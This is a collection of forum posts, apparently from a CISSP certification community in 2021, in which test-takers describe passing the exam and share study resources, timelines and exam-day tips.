* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

1794,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th.

My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

I have \~2.5 years experience in a startup role specializing in solutions for Critical Infrastructure and \~2.5 years in my current role of Cyber Audit for Critical Infrastructure. That said, I've been a Cyber Security enthusiast since I was 14 when I built my first (non-malicious) phishing site.

&#x200B;

On 6/12/2021 I managed to get a free voucher to take the CISSP exam, but it was set to expire at the end of August. I booked an exam at a local test center on 8/18/2021. I spent $0 on additional resources. I did get the ISC2 Official Practice Test book from a coworker who has his cert. My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones. I took the official practice tests for the videos I did watch and I was scoring in the 70%-80% range. I probably spent \~20-25 hours studying for the exam in total.

&#x200B;

At the end of the day, I either just got really lucky or experience actually does go a long way in preparing you for this exam (probably a little of both). If you're a professional in the field and have a reasonable amount of experience I would strongly suggest you just go for it because you may have a better chance of passing than you think (and maybe prepare a little better than I did).",2021-08-21

1797,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

Make sure you register your OSG and Practice test on Wiley for better experience and more questions.
3. Boson CISSP Test (Previous edition)
4. Mike Chapple CISSP Course on LinkedIn Learning
5. Kelly Handerhan on Cybrary

1. Shon Harris CISSP Book (8th edition) - Read SDLC from this book, it’s too good.
2. Adam Gordon (ITPROTV, New 2021 version CISSP Fast-track Course)
3. Prabh Nair’s YouTube Videos - Very important, Do not skip these videos.
4. Destination Certification YouTube Videos - Watched these videos many at times during preparation. Watched few videos night before exam also and they were spot on.
5. Mike Chapple last minute exam review
6. 11th hour CISSP and Memory palace by Prashant Mohan
7. And bunch of random Google search, Wikipedia, and YouTube videos.

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

I am happy to answer your questions while ensuring that I remain compliant towards the Code of Ethics. Good luck with your studies.

This seems like an exam where the preparation is the most daunting part given the volume of info that you might encounter on the exam. Thanks for all the comments and advice prior to the exam!

Posted this elsewhere but looking for a few more opinions.

Thinking about cancelling my upcoming test (four days away). Was scoring in the 80's on the Sybex official practice exams and figured I was ready. Then I watched Larry Greenblatt's CISSP questions on youtube and got almost all of them wrong (always narrowed it down to the correct two and then chose the wrong one). Then I took Thor's Hard CISSP Questions exam on Udemy today and scored 60.  Perhaps I'm rushing the process. Been studying for about 10 weeks.

This would be my first attempt and is paid for. Any further attempts would be out of pocket, though the expense doesn't bother me too much. Any feedback would be much appreciated.",2021-08-15
1821,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
1822,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.

1824,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

1825,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13
1826,p3fq82,"Obligatory ""I passed"" post","I was confident going in that I hadn't studied nearly enough, but by question 25 I was already positive that I was going to pass. Ended up passing at 100 questions in 93 minutes. 
Background wise I only have a year of direct cyber security experience as a security analyst, and a year of sys admin experience before that, plus some security and management experience from way back in the day. I also have the Cybersecurity Bachelor's from WGU, and a bunch of other lower level certs (CCSP, SSCP, AWS SAA, Cysa+, A+, Sec+, Net+, PenTest+, Project+, ITIL, couple of garbage EC-Council certs).

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it. I was getting around 80% on practice exams before sitting the exam.
I also watched that ""Why you will pass the CISSP"" video everyone recommends before leaving for the exam today, and it definitely helped getting in the right mindset for the test.

Now that I'm looking to move up in my career, while staying within the UK government sector, I'd like to have some specialised knowledge so I am not just another generic Project Manager.

1829,p35d9k,Officially Passed today!!!,"Sharing the good news here because without this group I don't think I would have made it. 

The exam is what everyone says, it's hard and grueling but i approached it with a mangers mindset and got the job done!

For anyone who is struggling please know that I failed this exam before but this group inspired me to keep going, so thanks you all. 

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads. 

Now good luck to anyone on their journey.

1832,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12

Got an email this morning saying my membership has been suspended for non payment and although a little sad at least I am not working for anyone else and my gym has the best surveillance system in the world :)Good luck to you all I have met many great people through the industry and it is well worth doing the CISSP if you want people to take you seriously.

Edit: Thank you all for the kind comments. I was finally able to make the one thing that kept me sane into a full time career. As an aside if I did have one piece of advice it would be to have something in your life that is completely different from IT in order to give you a different perspective on an ongoing basis.

1835,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

1838,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).

1844,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

